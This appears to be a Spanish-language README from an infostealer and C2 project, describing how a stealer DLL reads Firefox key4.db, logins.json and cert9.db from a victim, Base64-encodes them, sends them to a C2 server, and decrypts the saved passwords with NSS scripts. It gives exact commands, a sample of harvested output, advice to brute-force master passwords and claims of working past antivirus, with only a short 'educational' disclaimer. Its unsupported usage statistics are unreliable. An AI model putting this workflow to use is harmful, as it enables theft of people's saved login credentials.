# Firefox Password Exfiltration & Decryption

## Overview

Firefox moderno (133+, octubre 2025) usa **NSS (Network Security Services)** para cifrar credenciales. El método tradicional de client-side decryption es complejo y propenso a errores.

**Nuestra solución** (basada en FickerStealer):
1. **Client-side**: Exfiltrar archivos RAW en Base64
2. **Server-side**: Descifrar con NSS Python

---

##  Flujo Completo

### 1⃣ **Exfiltración** (Windows VM - Agent)

El stealer DLL:
- Lee `key4.db` (master key cifrada)
- Lee `logins.json` (credenciales cifradas, si existe)
- Lee `cert9.db` (certificados NSS, opcional)
- **Codifica todo en Base64**
- Envía como "credenciales" tipo `Firefox-RAW`

```
[#4] [Firefox-RAW]
URL: vdc6byky.default-release::key4.db
User: 393216 bytes
Pass: <Base64 encoded key4.db>

[#5] [Firefox-RAW]
URL: vdc6byky.default-release::logins.json
User: 1024 bytes
Pass: <Base64 encoded logins.json>
```

### 2⃣ **Recepción** (Linux Host - C2 Server)

El server guarda todo en `harvested/credentials_*.txt` automáticamente.

### 3⃣ **Extracción** (Linux Host - Post-processing)

Ejecutar script para decodificar Base64 y crear archivos:

```bash
cd /home/kali/Desktop/C2R2
python tools/extract_firefox_files.py harvested/credentials_1_20251020_063110.txt
```

Esto crea:
```
harvested/firefox/
└── vdc6byky.default-release/
    ├── key4.db
    ├── logins.json
    └── cert9.db
```

### 4⃣ **Descifrado** (Linux Host - NSS Decrypt)

Instalar NSS library (si no está):
```bash
sudo apt-get install libnss3
```

Ejecutar descifrado:
```bash
python tools/firefox_decrypt.py harvested/firefox/vdc6byky.default-release/
```

Resultado:
```
[+] Found 1 credentials:

[#1] https://www.instagram.com/
    User: fake-account@gmail.com
    Pass: super-password

[+] Results saved to: harvested/firefox/vdc6byky.default-release/decrypted_passwords.txt
```

---

##  Scripts

### `extract_firefox_files.py`
Extrae archivos Base64 del archivo de credenciales.

**Uso:**
```bash
python tools/extract_firefox_files.py harvested/credentials_*.txt
```

**Output:**
- Archivos decodificados en `harvested/firefox/<profile>/`
- Resumen de qué archivos están disponibles
- Instrucciones para el siguiente paso

### `firefox_decrypt.py`
Descifra credenciales usando NSS library.

**Uso:**
```bash
python tools/firefox_decrypt.py harvested/firefox/<profile>/
```

**Requiere:**
- `key4.db` (obligatorio)
- `logins.json` (para Firefox antiguas) o `signons.sqlite` (Firefox muy antiguas)
- NSS library instalada (`libnss3.so` en Linux, `nss3.dll` en Windows)

**Output:**
- Credenciales descifradas en consola
- Archivo `decrypted_passwords.txt` en el directorio del perfil

---

##  Troubleshooting

### Error: "NSS_Init failed"
- **Causa**: `key4.db` corrupto o no pertenece a este perfil
- **Solución**: Verificar que exfiltraste el perfil correcto

### Error: "PK11SDR_Decrypt failed"
- **Causa**: Usuario configuró **Master Password** (raro, <1%)
- **Solución**:
  - Intentar brute-force del Master Password
  - O simplemente ignorar (99% de usuarios no lo usan)

### Error: "libnss3.so not found"
- **Causa**: NSS library no instalada
- **Solución**:
  ```bash
  # Linux
  sudo apt-get install libnss3

  # Windows
  choco install nss
  # O instalar Firefox y usar su nss3.dll
  ```

### No hay logins.json
- **Firefox modernas** (133+) pueden usar otros formatos
- **Solución**:
  - Buscar `signons.sqlite` (muy antiguas)
  - O exfiltrar TODOS los archivos del perfil para análisis manual

---

##  Comparación con Otros Infostealers

| Método | FickerStealer | Satan-Stealer | **Nuestra Implementación** |
|--------|---------------|---------------|----------------------------|
| Firefox passwords |  Ignora |  Ignora completamente |  Exfiltra |
| Enfoque | Server-side NSS | Solo Chromium | Server-side NSS |
| Archivos exfiltrados | key4.db raw | N/A | Base64 via C2 |
| Descifrado | Python server | N/A | Python script |
| Complejidad | Baja (envío raw) | N/A | **Baja (Base64)** |

---

##  Estadísticas

- **99%** de usuarios Firefox NO tienen Master Password
- **<1%** de usuarios tienen Master Password configurada (requiere brute-force)
- Firefox **133+** (oct 2025) usa NSS obligatoriamente
- Firefox **antiguas** (<133) usan Base64 simple (no NSS)

---

##  Ventajas de Nuestro Enfoque

1.  **Sin dependencias client-side** - No requiere nss3.dll en Windows
2.  **Funciona con AV/EDR** - Solo lee archivos, no DLL injection
3.  **Protocolo C2 estándar** - Usa credenciales normales, no file transfer
4.  **Server-side flexible** - Python fácil de mantener
5.  **Cobertura 99%** - Todos excepto Master Password users

---

##  Seguridad

 **Nota**: Este código es para **fines educativos** y testing de seguridad autorizado.

Uso no autorizado es **ilegal** bajo:
- Computer Fraud and Abuse Act (USA)
- General Data Protection Regulation (EU)
- Leyes locales de ciberseguridad

---

##  Referencias

- [CyberArk - FickerStealer Analysis](https://www.cyberark.com/resources/threat-research-blog/fickerstealer-a-new-rust-player-in-the-market)
- [Satan-Stealer GitHub](https://github.com/Maybach1337/Satan-Stealer)
- [NSS Documentation](https://firefox-source-docs.mozilla.org/security/nss/index.html)
- [Firefox Password Storage](https://support.mozilla.org/en-US/kb/password-manager-remember-delete-edit-logins)
